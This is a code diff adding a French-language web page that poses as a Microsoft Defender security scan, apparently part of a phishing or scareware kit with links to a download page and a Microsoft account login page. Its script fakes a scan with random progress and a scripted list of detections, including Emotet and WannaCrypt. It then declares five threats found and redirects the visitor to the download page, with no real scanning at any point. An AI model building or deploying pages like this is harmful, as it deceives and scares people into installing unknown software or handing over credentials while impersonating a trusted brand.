@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Analyse en cours — Microsoft Defender</title>
+<link rel="stylesheet" href="style.css">
+<meta http-equiv="refresh" content="12;url=download.html">
+</head>
+<body>
+
+<nav class="topnav">
+<div class="logo">🛡️ Sécurité Windows</div>
+<ul class="nav-links">
+<li><a href="index.html">Tableau de bord</a></li>
+<li><a href="scan.html" class="active">Analyse</a></li>
+<li><a href="download.html">Mise à jour</a></li>
+<li><a href="login.html">Compte Microsoft</a></li>
+</ul>
+</nav>
+
+<main class="main">
+
+<div class="card">
+<div class="card-header"><span class="icon">🔍</span><h2>Analyse de sécurité en cours...</h2></div>
+
+<div class="scan-container">
+<div class="scan-spinner"></div>
+<div class="scan-progress" id="progress">0%</div>
+<div class="scan-status" id="status">Initialisation du scan...</div>
+<div class="progress" style="max-width:400px;margin:20px auto">
+<div class="progress-bar blue" id="progressBar" style="width:0%"></div>
+</div>
+</div>
+
+<div style="max-width:500px;margin:0 auto;font-size:13px;color:var(--gray-90)">
+<div id="scanLog"></div>
+</div>
+</div>
+
+<div class="card">
+<div class="card-header"><span class="icon">📊</span><h2>Résultats préliminaires</h2></div>
+<div class="grid grid-3">
+<div class="stat danger"><div class="value" id="threats">0</div><div class="label">Menaces trouvées</div></div>
+<div class="stat"><div class="value" id="files">0</div><div class="label">Fichiers analysés</div></div>
+<div class="stat warning"><div class="value" id="time">00:00</div><div class="label">Temps écoulé</div></div>
+</div>
+</div>
+
+</main>
+
+<footer class="footer">
+<p>Analyse Microsoft Defender • Ne fermez pas cette fenêtre</p>
+</footer>
+
+<script>
+let progress=0,threats=0,files=0,seconds=0;
+const log=document.getElementById('scanLog');
+const steps=[
+'Initialisation du moteur antimalware...',
+'Chargement des définitions de virus (v2026.07)...',
+'Analyse des processus en mémoire...',
+'Analyse du registre Windows...',
+'Vérification des fichiers système...',
+'Analyse du dossier Téléchargements...',
+'Analyse du dossier AppData...',
+'⚠️ Menace détectée: Trojan:Win32/Emotet.C!ml',
+'⚠️ Menace détectée: PUA:Win32/CoinMiner',
+'⚠️ Menace détectée: Backdoor:Win32/Bladabindi',
+'Analyse des extensions navigateur...',
+'⚠️ Menace détectée: Ransom:Win32/WannaCrypt.A',
+'Analyse du réseau...',
+'⚠️ Connexion suspecte bloquée (87.236.19.54)',
+'Analyse terminée — Génération du rapport...',
+];
+
+function update(){
+if(progress>=100)return;
+progress+=Math.random()*8+2;
+if(progress>100)progress=100;
+document.getElementById('progress').textContent=Math.floor(progress)+'%';
+document.getElementById('progressBar').style.width=progress+'%';
+files=Math.floor(progress*342);
+document.getElementById('files').textContent=files.toLocaleString();
+seconds=Math.floor(progress/3);
+let m=Math.floor(seconds/60),s=seconds%60;
+document.getElementById('time').textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+let stepIdx=Math.floor(progress/7);
+if(stepIdx<steps.length){
+let s=steps[stepIdx];
+if(s.includes('⚠️')){threats++;document.getElementById('threats').textContent=threats;}
+log.innerHTML+=s+'<br>';
+}
+if(progress>=100){
+document.getElementById('status').textContent='Analyse terminée — 5 menaces détectées';
+document.querySelector('.scan-spinner').style.display='none';
+setTimeout(()=>{window.location.href='download.html'},2000);
+}
+}
+
+setInterval(update,400);
+update();
+</script>
+</body>
+</html>
